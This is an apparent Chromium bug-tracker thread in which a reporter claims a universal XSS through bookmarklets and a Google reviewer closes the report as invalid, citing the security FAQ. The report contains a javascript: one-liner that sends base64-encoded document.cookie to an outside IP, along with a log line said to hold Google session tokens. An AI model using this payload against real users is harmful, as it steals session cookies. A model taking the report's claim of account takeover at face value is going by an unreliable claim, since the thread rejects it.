@@ -1,0 +1,123 @@
+Issue ID: 504814602
+
+Author: bu...@google.com
+<p>This issue has been closed as an incomplete or invalid report and we will     not respond to further comments. If you can improve your report please     open a fresh issue that addresses any feedback provided.</p>
+<p>For more information on our vulnerability policies, please refer to     <a href="https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/main/docs/security/severity-guidelines.md&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3tF2qtW2kEb9eMsfozR-Qg">https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md</a></p>
+
+Author: bu...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: bu...@google.com
+google_domain
+
+Author: ---
+
+### Report description
+
+
+Universal XSS and document.cookie theft via bookmark navigation
+
+
+---
+
+### Bug location
+
+
+#### Where do you want to report your vulnerability?
+
+Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)
+
+
+---
+
+### The problem
+
+
+#### Please describe the technical details of the vulnerability
+
+**Vulnerability Summary:**
+
+A logic flaw in Chrome's bookmarklet execution policy allows a javascript: URI to bypass origin restrictions and exfiltrate sensitive data. I have successfully demonstrated that an attacker can steal a user's full session cookies from gemini.google.com and send them to an external server without any security warnings.
+
+**Verified Proof of Concept (PoC):**
+
+I hosted a listener at http://3.80.77.106 and executed the following bookmarklet while on gemini.google.com:
+
+`javascript:(function(){    var data = btoa(document.cookie);    window.location.href = "http://3.80.77.106/?data=" + data;})();`
+
+**Server Logs (Exfiltration Proof):**
+
+`GET /?data=X2djbF9hdT0xLjEuMj...[TRUNCATED]... HTTP/1.1" 200 396 "https://gemini.google.com/"`
+
+Note: The truncated data above contains Base64 encoded SAPISID and SID tokens from the Google domain.
+
+
+#### Impact analysis
+
+This allows for Full Account Takeover. An attacker only needs to trick a user into clicking a bookmark once. The attack is highly effective and silent.
+
+
+---
+
+### The cause
+
+
+#### What version of Chrome have you found the security issue in?
+
+Version 147.0.7727.102 (Official Build) (64-bit)
+
+
+#### Is the security issue related to a crash?
+
+No, it is not related to a crash.
+
+
+#### Choose the type of vulnerability
+
+Cross-site scripting (XSS)
+
+
+#### How would you like to be publicly acknowledged for your report?
+
+Acknowledgment Information Name to be Credited: Min Si Thu @ James  / Public Link (LinkedIn): www.linkedin.com/in/min-si-thu-james-2ab977248
+TmpKa09EVTVaamxqT0RRMFpUYzROekUyTldWbE1XTXdPR1JsWlRsaE0yTT0=
+
+Author: si...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: si...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: si...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: ts...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ts...@google.com
+googlers_unrestricted
+
+Author: ts...@google.com
+See <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability" data-b-redirected-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#does-executing-javascript-from-a-bookmark-or-the-home-button-mean-there_s-an-xss-vulnerability</a>
+
+Author: ch...@google.com
+<p>This issue has been closed as an incomplete or invalid report and we will     not respond to further comments. If you can improve your report please     open a fresh issue that addresses any feedback provided.</p>
+<p>For more information on our vulnerability policies, please refer to     <a href="https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md" data-b-redirected-href="https://www.google.com/url?q=https://chromium.googlesource.com/chromium/src/%2B/main/docs/security/severity-guidelines.md&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3tF2qtW2kEb9eMsfozR-Qg">https://chromium.googlesource.com/chromium/src/+/main/docs/security/severity-guidelines.md</a></p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
